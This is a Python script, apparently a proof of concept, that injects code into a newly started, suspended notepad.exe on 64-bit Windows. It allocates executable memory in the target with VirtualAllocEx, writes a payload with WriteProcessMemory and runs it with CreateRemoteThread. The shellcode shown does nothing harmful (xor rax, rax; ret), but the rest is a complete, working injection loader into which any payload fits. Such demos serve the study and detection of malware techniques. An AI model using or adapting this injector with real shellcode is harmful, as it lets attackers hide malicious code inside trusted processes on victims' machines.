"""
Proof of Concept (barebones): Process Injection via CreateRemoteThread() (notepad.exe)
- for x64 process on x64 systems

Steps:
------
- Create SUSPENDED process                     -> CreateProcessW()
- Allocate memory                              -> VirtualAllocEx()
- Write payload into allocated memory          -> WriteProcessMemory()
- Create a new thread, and execute payload     -> CreateRemoteThread()
- Resume original thread                       -> ResumeThread()
"""


import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)


# Simple shellcode, deterministic where GetExitcodethread() == 0
payload = b"\x48\x31\xC0\xC3"       # xor rax, rax; ret


# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]



# force return type, due to c-types truncation
kernel32.VirtualAllocEx.restype = ctypes.c_void_p


# ----------------------------------
# Function Definitions
# ----------------------------------

def create_process():    
    lpApplicationName = r"c:\windows\system32\notepad.exe"

    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)
    lpProcessInformation = PROCESS_INFORMATION()

    if not kernel32.CreateProcessW(lpApplicationName, None, None, None, False, 0x04, None, None, ctypes.byref(lpStartupInfo), ctypes.byref(lpProcessInformation)):
        raise ctypes.WinError(ctypes.get_last_error())

    hThread = wintypes.HANDLE(lpProcessInformation.hThread)
    hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  
        
    return hThread, hProcess


def virtual_alloc_ex(hProcess, size):
    lpAddress = ctypes.c_void_p(0)
    dwSize = ctypes.c_size_t(size)

    lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, 0x1000 | 0x2000, 0x40)
    if not lpBaseAddress:
        raise ctypes.WinError(ctypes.get_last_error())
        
    return ctypes.c_void_p(lpBaseAddress)


def write_payload(hProcess, lpBaseAddress, lpBuffer):
    bytes_written = ctypes.c_size_t()   # number of bytes written
    nSize = len(lpBuffer)

    if not kernel32.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, ctypes.byref(bytes_written)):
        raise ctypes.WinError(ctypes.get_last_error())


def create_remote_thread(hProcess, lpBaseAddress):
    lpThreadId = wintypes.DWORD()
    if not kernel32.CreateRemoteThread(hProcess, None, 0, lpBaseAddress, None, 0, ctypes.byref(lpThreadId)):
        raise ctypes.WinError(ctypes.get_last_error())
        

# -------------------------------
# Main functionality starts here
# -------------------------------

# Step 1: create SUSPENDED process
hThread, hProcess = create_process()

# Step 2: allocate memory
lpBaseAddress = virtual_alloc_ex(hProcess, len(payload))

# Step 3: write payload into allocated memory
write_payload(hProcess, lpBaseAddress, payload)

# Step 4: create/execute new thread
create_remote_thread(hProcess, lpBaseAddress)

# Step 5: resume original thread/process execution
kernel32.ResumeThread(hThread)
